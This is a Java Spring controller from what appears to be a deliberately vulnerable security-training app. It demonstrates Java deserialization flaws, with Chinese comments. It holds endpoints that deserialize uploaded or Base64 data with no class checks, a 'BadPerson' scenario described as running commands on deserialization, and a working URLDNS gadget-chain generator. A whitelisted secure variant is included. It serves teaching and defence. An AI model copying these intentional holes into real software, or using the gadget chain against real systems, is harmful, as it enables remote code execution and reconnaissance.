package icu.secnotes.controller.DeSerialize;

import icu.secnotes.pojo.Person;
import icu.secnotes.pojo.Result;
// import icu.secnotes.utils.SerializationUtil;
import icu.secnotes.pojo.BadPerson;
import io.swagger.v3.oas.annotations.tags.Tag;
import lombok.extern.slf4j.Slf4j;
import org.springframework.http.HttpHeaders;
import org.springframework.http.HttpStatus;
import org.springframework.http.MediaType;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.*;
import org.springframework.web.multipart.MultipartFile;
import java.io.*;
import java.util.Base64;

@RestController
@RequestMapping("/deserialize")
@Slf4j
@Tag(name = "反序列化漏洞", description = "反序列化漏洞演示")
public class DeSerializeController {

    /**
     * 场景1：基础序列化演示 - 将Person对象序列化为文件
     */
    @PostMapping("/serializePerson")
    public ResponseEntity<byte[]> serializePerson(@RequestBody Person person) {
        try {
            // 1. 生成唯一文件名 - 修复容器路径问题
            String imagesDir = "/app/images";
            File imagesFolder = new File(imagesDir);
            if (!imagesFolder.exists()) imagesFolder.mkdirs();
            String fileName = "person_" + System.currentTimeMillis() + ".ser";
            String filePath = imagesDir + "/" + fileName;

            // 2. 序列化对象到文件
            ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(filePath));
            oos.writeObject(person);
            oos.close();

            log.info("序列化文件名: {}", filePath);

            // 3. 读取文件内容
            byte[] fileBytes = java.nio.file.Files.readAllBytes(java.nio.file.Paths.get(filePath));

            // 4. 设置响应头，文件名和images目录一致
            HttpHeaders headers = new HttpHeaders();
            headers.setContentType(MediaType.APPLICATION_OCTET_STREAM);
            headers.add(HttpHeaders.CONTENT_DISPOSITION, "attachment; filename=\"" + fileName + "\"");
            headers.add("Access-Control-Expose-Headers", "Content-Disposition");

            return new ResponseEntity<>(fileBytes, headers, HttpStatus.OK);
        } catch (Exception e) {
            return ResponseEntity.status(HttpStatus.INTERNAL_SERVER_ERROR).build();
        }
    }

    /**
     * 场景1：基础反序列化演示 - 从上传的文件反序列化Person对象
     */
    @PostMapping("/deserializePerson")
    public Result deserializePerson(@RequestParam("file") MultipartFile file) {
        try {
            log.info("开始反序列化Person对象，文件名: {}", file.getOriginalFilename());
            log.info("文件大小: {} 字节", file.getSize());
            log.info("文件内容类型: {}", file.getContentType());
            
            // 验证文件
            if (file.isEmpty()) {
                return Result.error("上传的文件为空");
            }
            
            if (file.getSize() < 10) {
                return Result.error("文件太小，可能不是有效的序列化文件");
            }
            
            // 从上传的文件读取序列化数据
            byte[] serializedData = file.getBytes();
            log.info("读取序列化数据，长度: {} 字节", serializedData.length);
            
            // 打印前几个字节用于调试
            if (serializedData.length > 0) {
                StringBuilder hexString = new StringBuilder();
                for (int i = 0; i < Math.min(16, serializedData.length); i++) {
                    hexString.append(String.format("%02X ", serializedData[i]));
                }
                log.info("文件前16字节: {}", hexString.toString());
            }
            
            // 验证序列化文件头
            if (serializedData.length < 2 || serializedData[0] != (byte)0xAC || serializedData[1] != (byte)0xED) {
                return Result.error("无效的序列化文件格式，缺少正确的文件头");
            }
            
            // 反序列化对象
            ByteArrayInputStream bais = new ByteArrayInputStream(serializedData);
            ObjectInputStream ois = new ObjectInputStream(bais);
            Object deserializedObject = ois.readObject();
            ois.close();
            
            // 验证反序列化的对象类型
            if (!(deserializedObject instanceof Person)) {
                return Result.error("反序列化的对象不是Person类型，而是: " + deserializedObject.getClass().getName());
            }
            
            Person deserializedPerson = (Person) deserializedObject;
            log.info("反序列化完成，结果: {}", deserializedPerson);
            
            return Result.success("反序列化成功: " + deserializedPerson.toString());
            
        } catch (Exception e) {
            log.error("反序列化Person对象失败", e);
            return Result.error("反序列化失败: " + e.getMessage());
        }
    }

    /**
     * 场景2：恶意对象序列化演示 - 将BadPerson对象序列化为文件
     */
    @PostMapping("/serializeBadPerson")
    public ResponseEntity<byte[]> serializeBadPerson(@RequestBody BadPerson badPerson) {
        try {
            // 1. 生成唯一文件名 - 修复容器路径问题
            String imagesDir = "/app/images";
            File imagesFolder = new File(imagesDir);
            if (!imagesFolder.exists()) imagesFolder.mkdirs();
            String fileName = "badPerson_" + System.currentTimeMillis() + ".ser";
            String filePath = imagesDir + "/" + fileName;

            // 2. 序列化对象到文件
            ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(filePath));
            oos.writeObject(badPerson);
            oos.close();

            log.info("BadPerson序列化文件名: {}", filePath);

            // 3. 读取文件内容
            byte[] fileBytes = java.nio.file.Files.readAllBytes(java.nio.file.Paths.get(filePath));

            // 4. 设置响应头，让浏览器下载文件
            HttpHeaders headers = new HttpHeaders();
            headers.setContentType(MediaType.APPLICATION_OCTET_STREAM);
            headers.add(HttpHeaders.CONTENT_DISPOSITION, "attachment; filename=\"" + fileName + "\"");
            headers.add("Access-Control-Expose-Headers", "Content-Disposition");

            return new ResponseEntity<>(fileBytes, headers, HttpStatus.OK);
        } catch (Exception e) {
            return ResponseEntity.status(HttpStatus.INTERNAL_SERVER_ERROR).build();
        }
    }

    /**
     * 场景2：恶意对象反序列化 - 反序列化BadPerson对象，自动执行危险命令
     */
    @PostMapping("/deserializeBadPerson")
    public Result deserializeBadPerson(@RequestParam("file") MultipartFile file) {
        try {
            log.info("开始反序列化BadPerson对象，文件名: {}", file.getOriginalFilename());
            log.info("文件大小: {} 字节", file.getSize());
            log.info("文件内容类型: {}", file.getContentType());

            if (file.isEmpty()) {
                return Result.error("上传的文件为空");
            }
            if (file.getSize() < 10) {
                return Result.error("文件太小，可能不是有效的序列化文件");
            }
            byte[] serializedData = file.getBytes();
            log.info("读取序列化数据，长度: {} 字节", serializedData.length);
            if (serializedData.length < 2 || serializedData[0] != (byte)0xAC || serializedData[1] != (byte)0xED) {
                return Result.error("无效的序列化文件格式，缺少正确的文件头");
            }
            
            // 重定向System.out来捕获命令执行结果
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            PrintStream originalOut = System.out;
            System.setOut(new PrintStream(baos));
            
            try {
                // 反序列化对象
                ByteArrayInputStream bais = new ByteArrayInputStream(serializedData);
                ObjectInputStream ois = new ObjectInputStream(bais);
                Object deserializedObject = ois.readObject();
                ois.close();
                
                if (!(deserializedObject instanceof BadPerson)) {
                    return Result.error("反序列化的对象不是BadPerson类型，而是: " + deserializedObject.getClass().getName());
                }
                BadPerson badPerson = (BadPerson) deserializedObject;
                log.info("BadPerson反序列化完成，结果: {}", badPerson);
                
                // 获取捕获的输出
                String capturedOutput = baos.toString();
                String resultMessage = "反序列化成功: " + badPerson.toString();
                if (capturedOutput.contains("BadPerson反序列化时执行命令结果:")) {
                    resultMessage += "\n命令执行结果: " + capturedOutput.split("BadPerson反序列化时执行命令结果:")[1].trim();
                }
                
                return Result.success(resultMessage);
            } finally {
                // 恢复原始的System.out
                System.setOut(originalOut);
            }
            
        } catch (Exception e) {
            log.error("反序列化BadPerson对象失败", e);
            return Result.error("反序列化失败: " + e.getMessage());
        }
    }

    /**
     * 场景3：URLDNS链序列化演示 - 生成URLDNS链序列化文件
     */
    @PostMapping("/serializeURLDNS")
    public ResponseEntity<byte[]> serializeURLDNS(@RequestBody java.util.Map<String, String> request) {
        try {
            String dnsUrl = request.get("dnsUrl");
            log.info("开始序列化URLDNS链，DNS URL: {}", dnsUrl);
            
            // 1. 生成唯一文件名 - 修复容器路径问题
            String imagesDir = "/app/images";
            File imagesFolder = new File(imagesDir);
            if (!imagesFolder.exists()) imagesFolder.mkdirs();
            String fileName = "urldns_" + System.currentTimeMillis() + ".ser";
            String filePath = imagesDir + "/" + fileName;

            // 2. 生成URLDNS链序列化数据
            byte[] serializedData = generateURLDNSChain(dnsUrl);
            
            // 3. 写入文件
            java.nio.file.Files.write(java.nio.file.Paths.get(filePath), serializedData);
            log.info("URLDNS序列化文件名: {}", filePath);

            // 4. 设置响应头，让浏览器下载文件
            HttpHeaders headers = new HttpHeaders();
            headers.setContentType(MediaType.APPLICATION_OCTET_STREAM);
            headers.add(HttpHeaders.CONTENT_DISPOSITION, "attachment; filename=\"" + fileName + "\"");
            headers.add("Access-Control-Expose-Headers", "Content-Disposition");

            return new ResponseEntity<>(serializedData, headers, HttpStatus.OK);
        } catch (Exception e) {
            log.error("序列化URLDNS链失败", e);
            return ResponseEntity.status(HttpStatus.INTERNAL_SERVER_ERROR).build();
        }
    }

    /**
     * 生成URLDNS链的序列化数据
     * 使用HashMap + URL的方式实现DNSLOG攻击
     */
    private byte[] generateURLDNSChain(String dnsUrl) throws Exception {
        // 1. 定义一个URL实例
        java.net.URL url = new java.net.URL(dnsUrl);
        
        // 2. 定义一个HashMap实例
        java.util.Map<java.net.URL, String> hashmap = new java.util.HashMap<>();
        
        // 3. 反射将url对象的hashCode属性值为非-1，为了不让序列化时发起dns请求
        Class<? extends java.net.URL> urlClass = url.getClass();
        java.lang.reflect.Field hashCodeField = urlClass.getDeclaredField("hashCode");
        hashCodeField.setAccessible(true);
        hashCodeField.set(url, 1234);
        
        // 4. 将url实例存入hashmap中
        hashmap.put(url, "SecNotes");
        
        // 5. 反射将url对象的hashCode属性改为-1，这样反序列化的时候才可以执行hashCode方法
        hashCodeField.set(url, -1);
        
        // 6. 序列化HashMap
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(hashmap);
        oos.close();
        
        return baos.toByteArray();
    }

    /**
     * 场景3：URLDNS链反序列化 - 反序列化URLDNS链，触发DNS查询
     */
    @PostMapping("/deserializeURLDNS")
    public Result deserializeURLDNS(@RequestParam("file") MultipartFile file) {
        try {
            log.info("开始反序列化URLDNS对象，文件名: {}", file.getOriginalFilename());
            log.info("文件大小: {} 字节", file.getSize());
            log.info("文件内容类型: {}", file.getContentType());

            if (file.isEmpty()) {
                return Result.error("上传的文件为空");
            }
            if (file.getSize() < 10) {
                return Result.error("文件太小，可能不是有效的序列化文件");
            }
            byte[] serializedData = file.getBytes();
            log.info("读取序列化数据，长度: {} 字节", serializedData.length);
            if (serializedData.length < 2 || serializedData[0] != (byte)0xAC || serializedData[1] != (byte)0xED) {
                return Result.error("无效的序列化文件格式，缺少正确的文件头");
            }
            
            // 重定向System.out来捕获DNS查询结果
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            PrintStream originalOut = System.out;
            System.setOut(new PrintStream(baos));
            
            try {
                // 反序列化URLDNS链 - 这里会触发DNS查询
                ByteArrayInputStream bais = new ByteArrayInputStream(serializedData);
                ObjectInputStream ois = new ObjectInputStream(bais);
                Object deserializedObject = ois.readObject();
                ois.close();
                
                log.info("URLDNS反序列化完成，对象类型: {}", deserializedObject.getClass().getName());
                
                // 获取捕获的输出
                String capturedOutput = baos.toString();
                String resultMessage = "URLDNS链反序列化成功，对象类型: " + deserializedObject.getClass().getName();
                if (capturedOutput.contains("触发DNS查询:") || capturedOutput.contains("DNS解析结果:")) {
                    resultMessage += "\nDNS查询结果: " + capturedOutput.trim();
                }
                
                return Result.success(resultMessage);
            } finally {
                // 恢复原始的System.out
                System.setOut(originalOut);
            }
            
        } catch (Exception e) {
            log.error("反序列化URLDNS对象失败", e);
            return Result.error("反序列化失败: " + e.getMessage());
        }
    }



    /**
     * 场景4：基础反序列化漏洞 - 接受Base64编码的序列化数据
     * 更加自由的反序列化任何数据，这是最危险的场景
     */
    @PostMapping(value = "/base64Deserialize", consumes = "text/plain")
    public Result base64Deserialize(@RequestBody String base64Data) {
        try {
            log.info("开始Base64反序列化演示，输入数据长度: {}", base64Data.length());
            
            // 清理Base64数据，移除可能的空白字符和换行符
            String cleanedBase64Data = base64Data.trim().replaceAll("\\s+", "");
            log.info("清理后的Base64数据长度: {}", cleanedBase64Data.length());
            
            // 解码Base64数据
            byte[] serializedData = Base64.getDecoder().decode(cleanedBase64Data);
            log.info("Base64解码完成，序列化数据长度: {} 字节", serializedData.length);
            
            // 直接反序列化 - 这是最危险的操作
            ByteArrayInputStream bais = new ByteArrayInputStream(serializedData);
            ObjectInputStream ois = new ObjectInputStream(bais);
            Object deserializedObject = ois.readObject();
            ois.close();
            
            log.info("Base64反序列化完成，对象类型: {}, 结果: {}", 
                    deserializedObject.getClass().getName(), deserializedObject.toString());
            
            return Result.success("Base64反序列化成功: " + deserializedObject.toString());
            
        } catch (Exception e) {
            log.error("Base64反序列化演示失败", e);
            return Result.error("Base64反序列化失败: " + e.getMessage());
        }
    }

    /**
     * 安全版本：使用白名单验证的反序列化
     */
    @PostMapping(value = "/secureDeserialize", consumes = "text/plain")
    public Result secureDeserialize(@RequestBody String base64Data) {
        try {
            log.info("开始安全反序列化演示，输入数据长度: {}", base64Data.length());
            
            // 清理Base64数据，移除可能的空白字符和换行符
            String cleanedBase64Data = base64Data.trim().replaceAll("\\s+", "");
            log.info("清理后的Base64数据长度: {}", cleanedBase64Data.length());
            
            // 解码Base64数据
            byte[] serializedData = Base64.getDecoder().decode(cleanedBase64Data);
            log.info("Base64解码完成，序列化数据长度: {} 字节", serializedData.length);
            
            // 使用自定义的ObjectInputStream进行安全检查
            ByteArrayInputStream bais = new ByteArrayInputStream(serializedData);
            SecureObjectInputStream ois = new SecureObjectInputStream(bais);
            Object deserializedObject = ois.readObject();
            ois.close();
            
            log.info("安全反序列化完成，对象类型: {}, 结果: {}", 
                    deserializedObject.getClass().getName(), deserializedObject.toString());
            
            return Result.success("安全反序列化成功: " + deserializedObject.toString());
            
        } catch (Exception e) {
            log.error("安全反序列化演示失败", e);
            return Result.error("安全反序列化失败: " + e.getMessage());
        }
    }



    /**
     * 自定义安全的ObjectInputStream，只允许反序列化安全的类
     */
    private static class SecureObjectInputStream extends ObjectInputStream {
        private static final String[] ALLOWED_CLASSES = {
            "icu.secnotes.pojo.Person",
            "java.lang.String",
            "java.lang.Integer",
            "java.util.HashMap"
        };

        public SecureObjectInputStream(InputStream in) throws IOException {
            super(in);
        }

        @Override
        protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
            String className = desc.getName();
            
            // 检查类是否在白名单中
            boolean isAllowed = false;
            for (String allowedClass : ALLOWED_CLASSES) {
                if (className.equals(allowedClass)) {
                    isAllowed = true;
                    break;
                }
            }
            
            if (!isAllowed) {
                throw new SecurityException("不允许反序列化类: " + className);
            }
            
            return super.resolveClass(desc);
        }
    }
}
